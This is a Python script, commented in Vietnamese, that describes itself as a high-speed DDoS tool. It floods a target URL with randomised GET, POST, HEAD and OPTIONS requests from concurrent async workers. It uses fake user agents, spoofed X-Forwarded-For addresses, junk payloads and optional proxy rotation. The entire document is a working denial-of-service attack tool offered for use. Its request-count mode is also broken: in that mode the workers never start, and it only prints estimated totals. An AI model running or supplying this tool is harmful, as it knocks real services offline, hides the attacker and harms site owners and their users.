import asyncio
import aiohttp
import random
import signal
from fake_useragent import UserAgent
import argparse
from datetime import datetime

# Biến toàn cục
STOP_FLAG = False
ua = UserAgent(fallback="Mozilla/5.0")

# Hàm xử lý tín hiệu dừng (Ctrl+C)
def signal_handler(sig, frame):
    global STOP_FLAG
    print("\n[!] Đã dừng tấn công theo yêu cầu.")
    STOP_FLAG = True

signal.signal(signal.SIGINT, signal_handler)

# Tạo header giả ngẫu nhiên
def generate_headers():
    headers = {
        "User-Agent": ua.random,
        "Accept": random.choice(["*/*", "text/html", "application/xhtml+xml"]),
        "Accept-Language": random.choice(["en-US,en;q=0.5", "fr-FR,fr;q=0.9"]),
        "Accept-Encoding": "gzip, deflate",
        "Connection": random.choice(["keep-alive", "close"]),
        "Upgrade-Insecure-Requests": "1",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }
    return headers

# Tạo payload giả ngẫu nhiên cho POST
def generate_payload():
    return {"data": "X" * random.randint(100, 1000)}

# Hàm worker gửi request (async)
async def worker(session, sem, url, proxies):
    global STOP_FLAG
    while not STOP_FLAG:
        async with sem:
            try:
                method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
                headers = generate_headers()
                params = {"random": random.randint(1, 1000000)} if method == "GET" else None
                data = generate_payload() if method == "POST" else None
                proxy = random.choice(proxies) if proxies else None

                start_time = datetime.now()
                async with session.request(
                    method,
                    url,
                    headers=headers,
                    params=params,
                    data=data,
                    proxy=proxy,
                    timeout=aiohttp.ClientTimeout(total=5)
                ) as response:
                    duration = (datetime.now() - start_time).total_seconds()
                    print(f"[{method}] {response.status} | {duration:.2f}s | {url}")
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                print(f"[!] Lỗi: {e}")
            except Exception as e:
                print(f"[!] Lỗi bất thường: {e}")

# Hàm chính
async def main():
    parser = argparse.ArgumentParser(description="Công cụ DDoS cao tốc (10k-100k RPS)")
    parser.add_argument("--url", required=True, help="URL mục tiêu (http://example.com)")
    parser.add_argument("--rps", type=int, default=10000, help="Requests per second (10k-100k)")
    parser.add_argument("--total", type=int, default=0, help="Tổng số request (0 = vô hạn)")
    parser.add_argument("--workers", type=int, default=200, help="Số luồng đồng thời")
    parser.add_argument("--proxies", nargs="*", default=[], help="Danh sách proxy (http://ip:port)")
    args = parser.parse_args()

    print(f"[+] Bắt đầu tấn công vào {args.url}")
    print(f"[+] Mục tiêu: {args.rps} RPS | Tổng: {args.total} request | Proxy: {len(args.proxies)}")

    # Tạo connector để tối ưu kết nối
    connector = aiohttp.TCPConnector(limit_per_host=0, ssl=False, force_close=False)
    timeout = aiohttp.ClientTimeout(total=None, sock_connect=5, sock_read=5)

    # Tạo session
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        # Tạo semaphore để kiểm soát tốc độ
        sem = asyncio.Semaphore(args.rps // 10)  # 10% concurrency safety

        # Tạo các task worker
        tasks = [worker(session, sem, args.url, args.proxies) for _ in range(args.workers)]

        # Đếm request nếu có total
        if args.total > 0:
            counter = 0
            while counter < args.total and not STOP_FLAG:
                await asyncio.sleep(1)
                counter += args.rps
                print(f"[+] Đã gửi: {counter} / {args.total}")
        else:
            await asyncio.gather(*tasks)

# Chạy ứng dụng
if __name__ == "__main__":
    asyncio.run(main())
